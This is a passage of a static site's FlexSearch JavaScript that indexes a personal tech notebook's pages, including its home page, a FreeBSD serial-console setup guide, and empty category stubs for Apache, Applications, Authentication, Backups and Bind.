type=module>
    var suggestions = document.getElementById('suggestions');
    var search = document.getElementById('flexsearch');

    const flexsearchContainer = document.getElementById('FlexSearchCollapse');

    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');

    const configObject = { toggle: false }
    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 

    if (search !== null) {
        document.addEventListener('keydown', inputFocus);
        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
            search.focus();
        });
        
        var topHeader = document.getElementById("top-header");
        document.addEventListener('click', function(elem) {
            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
                flexsearchContainerCollapse.hide();
        });
    }

    hideFlexsearchBtn.addEventListener('click', () =>{
        flexsearchContainerCollapse.hide()
    })

    function inputFocus(e) {
        if (e.ctrlKey && e.key === '/') {
            e.preventDefault();
            flexsearchContainerCollapse.toggle();
        }
        if (e.key === 'Escape' ) {
            search.blur();
            
            flexsearchContainerCollapse.hide();
        }
    };

    document.addEventListener('click', function(event) {

    var isClickInsideElement = suggestions.contains(event.target);

    if (!isClickInsideElement) {
        suggestions.classList.add('d-none');
    }

    });

    


    document.addEventListener('keydown',suggestionFocus);

    function suggestionFocus(e) {
    const suggestionsHidden = suggestions.classList.contains('d-none');
    if (suggestionsHidden) return;

    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
    if (focusableSuggestions.length === 0) return;

    const index = focusableSuggestions.indexOf(document.activeElement);

    if (e.key === "ArrowUp") {
        e.preventDefault();
        const nextIndex = index > 0 ? index - 1 : 0;
        focusableSuggestions[nextIndex].focus();
    }
    else if (e.key === "ArrowDown") {
        e.preventDefault();
        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
        focusableSuggestions[nextIndex].focus();
    }

    }

    


    (function(){

    var index = new FlexSearch.Document({
        
        tokenize: "forward",
        minlength:  0 ,
        cache:  100 ,
        optimize:  true ,
        document: {
        id: 'id',
        store: [
            "href", "title", "description"
        ],
        index: ["title", "description", "content"]
        }
    });


    


    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    


    

    

    index.add(
            {
                id:  0 ,
                href: "\/home\/",
                title: "cd ~",
                description: " My Tech Notebook Because human memory can not contain Gb info This site exists because it’s difficult to remember everything. I write things down here to help me remember important concepts while storing the details for reference. It serves as my personal knowledge repository, making it easier to revisit past learning rather than repeatedly researching the same topics. It’s also a pleasure to share knowledge with everyone. And anyone is welcome to submit a PR if they find an error. Navigation link article BSD\n",
                content: " My Tech Notebook Because human memory can not contain Gb info This site exists because it’s difficult to remember everything. I write things down here to help me remember important concepts while storing the details for reference. It serves as my personal knowledge repository, making it easier to revisit past learning rather than repeatedly researching the same topics. It’s also a pleasure to share knowledge with everyone. And anyone is welcome to submit a PR if they find an error. Navigation link article BSD\nFilesystems • Kernel • Misc • Network • Packages • Security dns Coding\nC • HTML • Java • SQL • Perl • PHP • Python • Shell script • SQL dns Ethical Hacking\nDatabase • Misc • Network • Operating Systems • Theory article Linux\nApplications • Coding \u0026 Debug • Desktop • Filesystems \u0026 Storage • Firewalls • Kernel • Misc • Multimedia • Network • Packages • Security dns Mac OS\nApplications • Coding • Hardware • Misc dns Misc\nFonera • Google • LaTeX • Misc • Soekris dns Network\nCisco • Theory host Servers\nAuthentication • Backups • Cloud computing • Configuration Managers • Containers • Databases • DNS • eMails • File sharing • High Availability • Misc • Monitoring • Network • Security • Versionning • Virtualization • Web • Webapps host Solaris\nApplications • Filesystems • Hardware • Misc • Network • Packages article Windows\nApplications • Misc Contact link info About me: I’m Pierre Mavro (Deimosfr), I’m CTO \u0026 Co-founder at Qovery, passionate about technologies, mostly on distributed, reliable, high-performance systems and databases. Also Cloud, Containerized infrastructures, and SQL/NoSQL databases requesting scaling and high performances. I’m also MariaDB High-Performance book author.\n"
            }
        );
    index.add(
            {
                id:  1 ,
                href: "\/Activer_le_port_s%C3%A9rie_sous_FreeBSD\/",
                title: "Activating the Serial Port on FreeBSD",
                description: "Learn how to configure and activate the serial port on FreeBSD systems for remote access and console management.",
                content: "Introduction linkBy default, the serial port is not activated. If you have a Soekris device, for example, it’s essential to activate it. Let’s see how to do this.\nConfiguration linkTo activate the standard output on the serial port (only stdout):\necho \"-h\" \u003e /boot.config Alternatively, you can choose to activate the serial port only if no keyboard is connected to the machine:\necho \"-P\" \u003e /boot.config Next, you’ll need to configure the stdin part (keyboard) by enabling this line by changing it to “on”:\n# /etc/ttys [...] # Serial terminals # The 'dialup' keyword identifies dialin lines to login, fingerd etc. ttyu0 \"/usr/libexec/getty std.9600\" dialup on secure [...] Reboot and then all you need to do is connect to it.\nReferences link https://www.freebsd.org/doc/en_US.ISO8859-1/books/handbook/serialconsole-setup.html "
            }
        );
    index.add(
            {
                id:  2 ,
                href: "\/docs\/servers\/web\/apache\/",
                title: "Apache",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  3 ,
                href: "\/docs\/linux\/applications\/",
                title: "Applications",
                description: "[OpenSSH](./applications/openssh) • [Shell](./applications/shell) • [Text Editors](./applications/text-editors)",
                content: ""
            }
        );
    index.add(
            {
                id:  4 ,
                href: "\/docs\/mac-os\/applications\/",
                title: "Applications",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  5 ,
                href: "\/docs\/solaris\/applications\/",
                title: "Applications",
                description: "[Services](./applications/services) • [Users Management](./applications/users-management)",
                content: ""
            }
        );
    index.add(
            {
                id:  6 ,
                href: "\/docs\/windows\/applications\/",
                title: "Applications",
                description: "[MIsc](./windows/misc)",
                content: ""
            }
        );
    index.add(
            {
                id:  7 ,
                href: "\/docs\/servers\/authentication\/",
                title: "Authentication",
                description: "[FreeRadius](./authentication/freeradius) • [Kerberos](./authentication/kerberos) • [OpenLDAP](./authentication/openldap) • [PAM](./authentication/pam) • [Radius](./authentication/radius) • [SSO](./authentication/sso)",
                content: ""
            }
        );
    index.add(
            {
                id:  8 ,
                href: "\/docs\/servers\/backups\/",
                title: "Backups",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  9 ,
                href: "\/docs\/servers\/dns\/bind\/",
                title: "Bind",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  10 ,
                href: "\/docs\/bsd\/",
                title: "BSD",
